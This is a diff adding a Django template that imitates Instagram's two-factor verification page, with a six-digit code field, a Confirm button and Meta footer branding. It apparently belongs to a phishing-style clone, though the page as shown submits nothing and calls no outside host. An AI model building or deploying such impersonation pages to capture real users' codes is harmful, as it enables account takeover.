@@ -1,0 +1,31 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <img src="{% static 'images/phone.png' %}" alt="Phone Icon" class="icon">
+                <h2>Just one more step</h2>
+            </div>
+            <p class="instruction">Enter the 6-digit code we sent to: <b>Phone Number</b></p>
+            <input type="text" class="code-input" placeholder="######">
+            <button class="confirm-btn">Confirm</button>
+            <a href="#" class="link">Change Number</a>
+            <a href="#" class="link">Log in</a>
+        </div>
+
+        <footer class="footer">
+            <p>Meta About Blog Jobs Help API Privacy Terms Locations Instagram Lite Threads Contact Uploading & Non-Users Meta Verified</p>
+            <p>&copy; 2024 Instagram from Meta</p>
+        </footer>
+    </div>
+</body>
+</html>
